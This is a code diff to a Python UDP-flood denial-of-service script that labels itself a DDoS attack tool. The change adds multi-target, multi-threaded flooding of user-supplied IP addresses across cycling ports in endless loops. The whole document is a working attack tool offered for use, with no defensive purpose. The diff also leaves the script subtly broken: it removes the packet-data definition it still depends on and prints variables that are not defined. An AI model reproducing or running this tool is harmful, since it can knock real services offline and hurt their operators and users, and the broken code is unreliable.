@@ -3,6 +3,7 @@ import time
 import socket
 import scapy.all as scapy
 import random
+import threading
 
 # DDOS-Attack [ASCII Art]
 
@@ -33,26 +34,33 @@ mydate = time.strftime('%Y-%m-%d')
 mytime = time.strftime('%H-%M')
 
 # Lets define sock and bytes for our attack
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+def send_packets(ip, port, bytes, proxy_size):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sent = 0
+    while True:
+        for i in range(proxy_size):
+            sock.sendto(bytes, (ip, port))
+            sent += 1
+            port += 1
+            if port == 65534:
+                port = 1
 
 # Type your ip and port number (find IP address using nslookup or any online website)
-ip = input("IP Target : ")
-port = eval(input("Port       : "))
+ips = input("IP Targets (separated by commas): ").split(',')
+ports = input("Ports (separated by commas): ").split(',')
+proxy_size = int(input("Proxy Size : "))
+threads = int(input("Number of threads : "))
 
 # Lets start the attack
 print("Thank you for using the KARTHIK-LAL (DDOS-ATTACK-TOOL).")
-print("Starting the attack on ", ip, " at port ", port, "...")
+print("Starting the attack on ", ip, " at port ", port, " with a proxy size of ", proxy_size, "...")
 
-time.sleep(5)
-sent = 0
-while True:
-    sock.sendto(bytes, (ip, port))
-    sent = sent + 1
-    port = port + 1
-    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
-    if port == 65534:
-        port = 1
+time.sleep(3)
+for ip in ips:
+    for port in ports:
+        for i in range(threads):
+            t = threading.Thread(target=send_packets, args=(ip, int(port), bytes, proxy_size))
+            t.start()            
 
 # End of the script
 os.system("cls")
